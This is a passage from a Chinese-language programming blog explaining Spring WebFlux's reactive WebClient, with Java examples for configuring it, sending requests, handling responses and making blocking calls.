<li><strong>函数式编程风格</strong>: 代码更加声明式和不可变，易于测试和推理。<code>HandlerFunction</code> 只是一个接收 <code>ServerRequest</code> 返回 <code>Mono&lt;ServerResponse&gt;</code> 的函数，单元测试非常简单。</li>
<li><strong>关注点分离</strong>: 路由逻辑和业务处理逻辑被清晰地分离在不同的类中，职责更单一。</li>
</ol>
<p><strong>适用场景</strong>:</p>
<ul>
<li>需要构建高度动态或复杂的路由规则。</li>
<li>对性能有极致要求的场景。</li>
<li>偏爱函数式编程风格，追求更强类型安全和代码控制力的团队。</li>
<li>构建轻量级的、专注于代理或路由的微服务。</li>
</ul>
<hr>
<h3 id="2-4-WebClient-响应式HTTP客户端"><a href="#2-4-WebClient-响应式HTTP客户端" class="headerlink" title="2.4 WebClient (响应式HTTP客户端)"></a>2.4 WebClient (响应式HTTP客户端)</h3><h4 id="2-4-1-什么是-WebClient？"><a href="#2-4-1-什么是-WebClient？" class="headerlink" title="2.4.1 什么是 WebClient？"></a>2.4.1 什么是 <code>WebClient</code>？</h4><p><code>WebClient</code> 是 Spring 5 中引入的一个<strong>现代化的、响应式的、非阻塞的HTTP客户端</strong>。它是作为传统的、同步阻塞的 <code>RestTemplate</code> 的替代品而设计的。</p>
<ul>
<li><strong>定位</strong>: Spring WebFlux 官方推荐的HTTP请求工具。</li>
<li><strong>核心特性</strong>:<ul>
<li><strong>非阻塞I&#x2F;O</strong>: 底层基于Netty等非阻塞I&#x2F;O库，发送请求时不会阻塞当前线程。</li>
<li><strong>响应式API</strong>: 它的API设计完全基于Project Reactor的 <code>Mono</code> 和 <code>Flux</code>，可以无缝地集成到响应式处理链中。</li>
<li><strong>流式处理</strong>: 能够高效地处理大量的或持续的数据流（如文件上传下载、Server-Sent Events）。</li>
<li><strong>函数式风格</strong>: 提供了一个流畅的、链式调用的函数式API来构建和发送请求。</li>
</ul>
</li>
</ul>
<p><strong><code>RestTemplate</code> vs <code>WebClient</code></strong>:</p>
<table>
<thead>
<tr>
<th align="left">特性</th>
<th align="left"><code>RestTemplate</code> (维护模式)</th>
<th align="left"><code>WebClient</code> (推荐)</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>编程模型</strong></td>
<td align="left"><strong>同步阻塞</strong></td>
<td align="left"><strong>异步非阻塞</strong></td>
</tr>
<tr>
<td align="left"><strong>返回类型</strong></td>
<td align="left">直接返回具体对象 (<code>User</code>, <code>String</code>)</td>
<td align="left">返回 <code>Mono&lt;T&gt;</code> 或 <code>Flux&lt;T&gt;</code> (数据的“承诺”)</td>
</tr>
<tr>
<td align="left"><strong>线程模型</strong></td>
<td align="left">每个请求占用一个线程直到响应返回</td>
<td align="left">使用少量Event Loop线程处理大量并发请求</td>
</tr>
<tr>
<td align="left"><strong>适用场景</strong></td>
<td align="left">传统的Spring MVC应用、简单的同步调用</td>
<td align="left"><strong>Spring WebFlux应用</strong>、高并发微服务间通信、流式API</td>
</tr>
<tr>
<td align="left"><strong>状态</strong></td>
<td align="left">Spring官方已将其置于<strong>维护模式</strong>，不再添加新功能。</td>
<td align="left">Spring官方<strong>主推</strong>的现代HTTP客户端。</td>
</tr>
</tbody></table>
<hr>
<h4 id="2-4-2-如何使用-WebClient？"><a href="#2-4-2-如何使用-WebClient？" class="headerlink" title="2.4.2 如何使用 WebClient？"></a>2.4.2 如何使用 <code>WebClient</code>？</h4><p>使用 <code>WebClient</code> 通常分为三步：</p>
<ol>
<li><strong>创建 <code>WebClient</code> 实例</strong></li>
<li><strong>构建 HTTP 请求</strong></li>
<li><strong>处理响应</strong></li>
</ol>
<h5 id="1-创建-WebClient-实例"><a href="#1-创建-WebClient-实例" class="headerlink" title="1. 创建 WebClient 实例"></a>1. 创建 <code>WebClient</code> 实例</h5><p><code>WebClient</code> 实例是<strong>线程安全的</strong>和<strong>不可变的</strong>，因此通常建议在应用中创建一个<strong>单例</strong>的 <code>WebClient</code> Bean，并根据需要进行复用。</p>
<p><strong>方式一：使用默认设置创建</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebClient</span> <span class="variable">client</span> <span class="operator">=</span> WebClient.create();</span><br></pre></td></tr></table></figure>

<p><strong>方式二：指定基础URL创建</strong></p>
<p>这是最常见的方式，可以为所有从此客户端发出的请求设置一个公共的基础URL。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebClient</span> <span class="variable">client</span> <span class="operator">=</span> WebClient.create(<span class="string">&quot;http://api.example.com&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><strong>方式三：使用构建器进行高级定制 (推荐)</strong></p>
<p>通过 <code>WebClient.builder()</code> 可以进行更详细的配置，如设置默认请求头、超时、过滤器等。</p>
<p><strong>在 <code>@Configuration</code> 类中创建 <code>WebClient</code> Bean</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpHeaders;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.reactive.function.client.WebClient;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebClientConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> WebClient <span class="title function_">webClient</span><span class="params">(WebClient.Builder builder)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> builder</span><br><span class="line">                .baseUrl(<span class="string">&quot;http://api.example.com&quot;</span>) <span class="comment">// 设置基础URL</span></span><br><span class="line">                .defaultHeader(HttpHeaders.CONTENT_TYPE, MediaType.APPLICATION_JSON_VALUE) <span class="comment">// 设置默认请求头</span></span><br><span class="line">                .defaultHeader(<span class="string">&quot;X-App-Name&quot;</span>, <span class="string">&quot;MyCoolApp&quot;</span>)</span><br><span class="line">                <span class="comment">// ... 还可以设置超时、过滤器、负载均衡等</span></span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Spring Boot会自动配置一个 <code>WebClient.Builder</code> Bean，我们可以在配置类中直接注入并使用它。这样做的好处是可以保留Spring Boot对<code>WebClient</code>的自动配置（如编解码器等）。</p>
</blockquote>
<hr>
<h5 id="2-构建并发送请求-Fluent-API"><a href="#2-构建并发送请求-Fluent-API" class="headerlink" title="2. 构建并发送请求 (Fluent API)"></a>2. 构建并发送请求 (Fluent API)</h5><p><code>WebClient</code> 的API是链式调用的，非常流畅。</p>
<p><strong>请求构建流程</strong>:</p>
<ol>
<li><strong>指定HTTP方法</strong>: <code>.get()</code>, <code>.post()</code>, <code>.put()</code>, <code>.delete()</code> …</li>
<li><strong>指定URI</strong>: <code>.uri(&quot;/users/{id}&quot;, 123)</code>。URI是相对于基础URL的。</li>
<li><strong>设置请求头 (可选)</strong>: <code>.header(&quot;Authorization&quot;, &quot;Bearer ...&quot;)</code>。</li>
<li><strong>设置请求体 (对于POST&#x2F;PUT)</strong>: <code>.bodyValue(object)</code> 或 <code>.body(publisher, class)</code>。</li>
<li><strong>发送请求</strong>: <code>.retrieve()</code>。</li>
<li><strong>处理响应</strong>: <code>.bodyToMono(class)</code> 或 <code>.bodyToFlux(class)</code>。</li>
</ol>
<hr>
<h5 id="3-处理响应"><a href="#3-处理响应" class="headerlink" title="3. 处理响应"></a>3. 处理响应</h5><p><code>WebClient</code> 提供了两种主要的方式来处理响应：<code>retrieve()</code> 和 <code>exchangeToMono</code>&#x2F;<code>exchangeToFlux</code>。</p>
<p><strong>i. 使用 <code>retrieve()</code> (最常用、最简单)</strong></p>
<p><code>retrieve()</code> 方法是处理响应最直接的方式。它会自动检查 <code>4xx</code> 和 <code>5xx</code> 系列的状态码，如果遇到，会直接将 <code>Mono</code> 或 <code>Flux</code> 转换为<strong>错误信号</strong> (<code>onError</code>)，并抛出 <code>WebClientResponseException</code>。</p>
<p><strong>示例：</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Flux;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ApiService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> WebClient webClient;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ApiService</span><span class="params">(WebClient webClient)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.webClient = webClient;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取单个用户 (返回 Mono)</span></span><br><span class="line">    <span class="keyword">public</span> Mono&lt;User&gt; <span class="title function_">getUserById</span><span class="params">(Long id)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.webClient.get()</span><br><span class="line">                .uri(<span class="string">&quot;/users/&#123;id&#125;&quot;</span>, id)</span><br><span class="line">                .retrieve()</span><br><span class="line">                <span class="comment">// 将响应体转换为 Mono&lt;User&gt;</span></span><br><span class="line">                .bodyToMono(User.class)</span><br><span class="line">                .doOnError(e -&gt; System.err.println(<span class="string">&quot;Failed to fetch user: &quot;</span> + e.getMessage()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取所有用户 (返回 Flux)</span></span><br><span class="line">    <span class="keyword">public</span> Flux&lt;User&gt; <span class="title function_">getAllUsers</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.webClient.get()</span><br><span class="line">                .uri(<span class="string">&quot;/users&quot;</span>)</span><br><span class="line">                .retrieve()</span><br><span class="line">                <span class="comment">// 将响应体转换为 Flux&lt;User&gt;</span></span><br><span class="line">                .bodyToFlux(User.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个新用户 (使用 POST 并发送请求体)</span></span><br><span class="line">    <span class="keyword">public</span> Mono&lt;User&gt; <span class="title function_">createUser</span><span class="params">(User newUser)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.webClient.post()</span><br><span class="line">                .uri(<span class="string">&quot;/users&quot;</span>)</span><br><span class="line">                .bodyValue(newUser) <span class="comment">// bodyValue() 用于发送一个普通对象</span></span><br><span class="line">                .retrieve()</span><br><span class="line">                .bodyToMono(User.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>ii. 使用 <code>exchangeToMono</code> &#x2F; <code>exchangeToFlux</code> (高级用法)</strong></p>
<p><code>exchangeTo...</code> 方法提供了对响应的<strong>完全控制权</strong>，包括状态码和响应头。它<strong>不会</strong>自动处理错误状态码，你需要自己检查。</p>
<p>这在你需要根据不同的状态码执行不同逻辑时非常有用。</p>
<p><strong>示例：根据状态码进行不同处理</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Mono&lt;User&gt; <span class="title function_">getUserWithCustomErrorHandling</span><span class="params">(Long id)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.webClient.get()</span><br><span class="line">            .uri(<span class="string">&quot;/users/&#123;id&#125;&quot;</span>, id)</span><br><span class="line">            .exchangeToMono(response -&gt; &#123;</span><br><span class="line">                <span class="comment">// response 是 ClientResponse 对象</span></span><br><span class="line">                <span class="keyword">if</span> (response.statusCode().is2xxSuccessful()) &#123;</span><br><span class="line">                    <span class="comment">// 如果是2xx成功，正常转换响应体</span></span><br><span class="line">                    <span class="keyword">return</span> response.bodyToMono(User.class);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (response.statusCode().equals(HttpStatus.NOT_FOUND)) &#123;</span><br><span class="line">                    <span class="comment">// 如果是404，返回一个空的Mono</span></span><br><span class="line">                    <span class="keyword">return</span> Mono.empty();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 其他错误情况，创建一个自定义的异常并放入错误信号</span></span><br><span class="line">                    <span class="keyword">return</span> response.createException()</span><br><span class="line">                            .flatMap(ex -&gt; Mono.error(<span class="keyword">new</span> <span class="title class_">MyCustomException</span>(<span class="string">&quot;API call failed&quot;</span>, ex)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="2-4-3-同步调用-WebClient"><a href="#2-4-3-同步调用-WebClient" class="headerlink" title="2.4.3 同步调用 WebClient"></a>2.4.3 同步调用 <code>WebClient</code></h4><p>虽然 <code>WebClient</code> 是为异步而生，但在某些特殊情况（如与遗留的同步代码集成、或在简单的命令行应用中），你可能需要阻塞等待结果。可以通过 <code>.block()</code> 方法实现。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// !!! 警告：仅在非响应式上下文中使用，如main方法或测试中 !!!</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">syncCall</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> webClient.get()</span><br><span class="line">                .uri(<span class="string">&quot;/users/1&quot;</span>)</span><br><span class="line">                .retrieve()</span><br><span class="line">                .bodyToMono(User.class)</span><br><span class="line">                .block(Duration.ofSeconds(<span class="number">5</span>)); <span class="comment">// 阻塞最多5秒等待结果</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Synchronously fetched user: &quot;</span> + user);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (WebClientResponseException e) &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;Error: &quot;</span> + e.getRawStatusCode() + <span class="string">&quot; - &quot;</span> + e.getResponseBodyAsString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>再次强调</strong>：<strong>永远不要在WebFlux的Controller或任何响应式管道中调用 <code>.block()</code></strong>。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">冉丝堂</span>
  </div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
